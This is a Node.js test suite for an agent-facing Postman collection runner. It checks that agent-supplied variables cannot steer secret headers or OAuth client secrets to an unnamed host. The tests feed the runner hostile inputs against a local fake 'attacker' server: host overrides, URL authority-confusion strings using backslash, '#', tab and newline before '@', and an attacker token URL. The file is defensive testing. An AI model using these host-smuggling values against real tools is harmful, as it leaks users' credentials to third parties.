'use strict';

/**
 * End to end: an agent-supplied variable/data value must not send a secret (a header carrying a secret
 * environment value, an OAuth client secret) to a host the collection/environment did not name.
 * Both servers listen on 127.0.0.1; the "attacker" one must never receive anything.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const { startServer } = require('./client');
const { startFakeApi } = require('./fake-server');
const { makeTmp, writeJson, ENV_SECRET } = require('./fixtures');

const OAUTH_SECRET = 'oauthClientSecret_Zq81Lm20Pp';
const secretHeader = [{ key: 'X-Env-Secret', value: '{{hidden}}' }];
const oauth = (tokenUrl) => ({ type: 'oauth2', oauth2: { grantType: 'client_credentials', clientId: 'cid', clientSecret: OAUTH_SECRET, tokenUrl } });

async function setup(flags) {
  const api = await startFakeApi();
  const attacker = await startFakeApi();
  const dir = makeTmp();
  const host = `127.0.0.1:${api.port}`;
  writeJson(dir, 'g.postman_collection.json', {
    info: { name: 'Guard', schema: 'https://schema.getpostman.com/json/collection/v2.1.0/collection.json' },
    variable: [{ key: 'host', value: host }, { key: 'tokc', value: `${api.base}/token` }],
    item: [
      { name: 'PathId', id: 'pathid', request: { method: 'GET', url: '{{base}}/p/{{id}}', header: secretHeader } },
      { name: 'Plain', id: 'plain', request: { method: 'GET', url: '{{base}}/echo', header: secretHeader } },
      { name: 'NoBase', id: 'nobase', request: { method: 'GET', url: 'http://{{nbhost}}/echo/{{id}}', header: secretHeader } },
      { name: 'NoBaseQ', id: 'nobaseq', request: { method: 'GET', url: 'http://{{nbhost}}/echo?k={{k}}', header: secretHeader } },
      { name: 'Query', id: 'query', request: { method: 'GET', url: 'http://{{host}}/echo?k={{k}}', header: secretHeader } },
      { name: 'Diff', id: 'diff', request: { method: 'GET', url: 'http://{{host}}/echo', header: secretHeader } },
      { name: 'OauthNoBase', id: 'oauthnb', request: { method: 'GET', url: '{{base}}/echo', auth: oauth('{{tok}}') } },
      { name: 'OauthBase', id: 'oauthb', request: { method: 'GET', url: '{{base}}/echo', auth: oauth('{{tokc}}') } },
    ],
  });
  writeJson(dir, 'env.json', { name: 'Env', values: [{ key: 'base', value: api.base, enabled: true }, { key: 'hidden', value: ENV_SECRET, enabled: true, secret: true }] });
  const s = startServer(['--workspace', dir, ...flags]);
  await s.initialize();
  return { api, attacker, s, host, attackerHost: `127.0.0.1:${attacker.port}`, col: 'g.postman_collection.json', env: 'env.json' };
}

async function withSetup(t, flags, fn) {
  const x = await setup(flags);
  t.after(async () => { await x.s.close(); await x.api.close(); await x.attacker.close(); });
  return fn(x);
}

const MODES = [['--allow-any-host'], ['--allow-host', '127.0.0.1']];

test('a placeholder elsewhere in the URL does not let the agent move the host (path id / query)', async (t) => {
  for (const flags of MODES) {
    await withSetup(t, flags, async ({ s, col, env, attacker, attackerHost }) => {
      const a = await s.call('run_request', { collection: col, request: 'Query', environment: env, data: { host: attackerHost, k: '1' } });
      assert.equal(a.isError, true, `${flags}: ${a.text}`);
      assert.match(a.text, /would change the target host/);
      assert.deepEqual(attacker.hits, {}, `${flags}: the attacker received a request`);
    });
  }
});

test('an authority defined only by the agent is refused with --allow-any-host (path or query placeholder)', async (t) => {
  await withSetup(t, ['--allow-any-host'], async ({ s, col, env, attacker, attackerHost }) => {
    for (const request of ['NoBase', 'NoBaseQ']) {
      const r = await s.call('run_request', { collection: col, request, environment: env, data: { nbhost: attackerHost, id: '1', k: '1' } });
      assert.equal(r.isError, true, `${request}: ${r.text}`);
      assert.match(r.text, /Refused/);
      assert.ok(!r.text.includes(ENV_SECRET));
    }
    assert.deepEqual(attacker.hits, {});
  });
});

test('with --allow-host only the list decides for an agent-defined host: the socket layer blocks it', async (t) => {
  await withSetup(t, ['--allow-host', '127.0.0.1:1'], async ({ s, col, env, attacker, attackerHost }) => {
    const r = await s.call('run_request', { collection: col, request: 'NoBase', environment: env, data: { nbhost: attackerHost, id: '1' } });
    assert.ok(r.isError || (r.data && r.data.result && r.data.result.error), r.text);
    assert.deepEqual(attacker.hits, {});
  });
});

test('differential authority parsing (backslash, #, tab, newline) cannot reach another host', async (t) => {
  await withSetup(t, ['--allow-any-host'], async ({ s, col, env, attacker, attackerHost, host, api }) => {
    for (const evil of [`${attackerHost}\\@${host}`, `${attackerHost}#@${host}`, `${host}\t@${attackerHost}`, `${attackerHost}\n@${host}`, `${attackerHost}/@${host}`]) {
      const r = await s.call('run_request', { collection: col, request: 'Diff', environment: env, data: { host: evil } });
      assert.equal(r.isError, true, `${JSON.stringify(evil)}: ${r.text}`);
      assert.deepEqual(attacker.hits, {}, `${JSON.stringify(evil)}: the attacker received a request`);
    }
    assert.equal(api.hits['/echo'], undefined, 'nothing reached the legitimate server either');
  });
});

test('an OAuth tokenUrl supplied by the agent cannot receive the client secret', async (t) => {
  for (const request of ['OauthNoBase', 'OauthBase']) {
    await withSetup(t, ['--allow-any-host'], async ({ s, col, env, attacker, attackerHost }) => {
      const url = `http://${attackerHost}/token`;
      const r = await s.call('run_request', { collection: col, request, environment: env, variables: { tok: url, tokc: url } });
      assert.equal(r.isError, true, `${request}: ${r.text}`);
      assert.match(r.text, /oauth2\.tokenUrl/);
      assert.deepEqual(attacker.hits, {}, `${request}: the attacker received the token call`);
    });
  }
});

test('legitimate use stays allowed: the agent changes a path id or query value, not the authority', async (t) => {
  for (const flags of MODES) {
    await withSetup(t, flags, async ({ s, col, env, api, attacker }) => {
      const r = await s.call('run_request', { collection: col, request: 'PathId', environment: env, variables: { id: '42' } });
      assert.equal(r.isError, false, r.text);
      assert.equal(r.data.result.status, 200);
      assert.equal(api.hits['/p/42'], 1);
      const q = await s.call('run_request', { collection: col, request: 'Query', environment: env, data: { k: '9' } });
      assert.equal(q.isError, false, q.text);
      assert.equal(api.hits['/echo'], 1);
      assert.deepEqual(attacker.hits, {});
    });
  }
});

test('previous scenario still holds: a secret header with data.base pointing at another host is refused', async (t) => {
  await withSetup(t, ['--allow-any-host'], async ({ s, col, env, attacker, attackerHost }) => {
    for (const request of ['Plain', 'PathId']) {
      const r = await s.call('run_request', { collection: col, request, environment: env, data: { base: `http://${attackerHost}`, id: '1' } });
      assert.equal(r.isError, true, `${request}: ${r.text}`);
    }
    assert.deepEqual(attacker.hits, {});
  });
});
